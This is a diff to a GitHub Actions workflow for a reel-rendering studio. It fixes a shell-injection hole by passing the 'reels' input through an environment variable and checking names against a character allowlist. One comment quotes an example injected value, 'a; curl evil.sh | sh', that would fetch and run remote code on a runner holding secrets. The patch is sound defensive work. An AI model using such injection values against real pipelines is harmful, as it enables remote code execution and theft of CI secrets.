@@ -69,16 +69,35 @@ jobs:
         # A bad palette or a missing scene file fails several minutes into the
         # render, after Chromium has downloaded. This catches that class in a
         # second, and fails the job before anything expensive starts.
+        #
+        # `reels` reaches the shell through the environment, never through a
+        # ${{ }} expression: an expression is pasted into the script before bash
+        # sees it, so a name like `a; curl evil.sh | sh` would execute on a
+        # runner holding the Telegram secrets and a writable GITHUB_TOKEN. The
+        # character allowlist keeps it to real config names.
         working-directory: studio
-        run: python3 validate-reels.py ${{ inputs.reels }}
+        env:
+          REELS: ${{ inputs.reels }}
+        run: |
+          set -euo pipefail
+          for name in $REELS; do
+            case "$name" in
+              *[!A-Za-z0-9._-]*|""|.*)
+                echo "::error::invalid reel name: $name"
+                exit 1
+                ;;
+            esac
+          done
+          python3 validate-reels.py $REELS
 
       - name: Render
         working-directory: studio
         env:
           PYTHON_BIN: python3
+          REELS: ${{ inputs.reels }}
         run: |
           set -euo pipefail
-          for name in ${{ inputs.reels }}; do
+          for name in $REELS; do
             echo "::group::rendering $name"
             node make-reel.js "reels/$name.json"
             echo "::endgroup::"
